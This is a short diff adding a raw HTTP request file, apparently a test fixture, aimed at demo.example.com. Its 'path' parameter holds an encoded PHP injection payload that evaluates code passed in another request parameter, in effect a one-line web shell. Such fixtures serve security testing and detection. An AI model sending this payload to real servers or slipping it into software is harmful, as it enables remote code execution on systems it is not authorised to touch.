@@ -1,0 +1,4 @@
+GET /a?path=$x%3D$_REQUEST[\u0027x\u0027]\u003Beval($x)\u003B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
